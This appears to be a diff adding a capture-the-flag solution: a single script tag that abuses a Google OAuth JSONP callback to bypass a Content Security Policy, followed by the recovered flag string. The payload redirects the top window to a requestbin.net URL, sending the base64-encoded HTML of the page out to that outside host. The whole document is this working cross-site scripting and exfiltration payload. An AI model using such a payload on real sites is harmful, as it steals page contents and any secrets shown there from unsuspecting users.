@@ -1,0 +1,5 @@
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=setTimeout(function(){window.top.location='http://requestbin.net/r/5418c6qz?flag='.concat(btoa(encodeURIComponent(document.body.innerHTML)))},100)();"></script>
+
+CSP_4ND_JS0NP_ENDPOINT_B4D_ID3A
+  
+
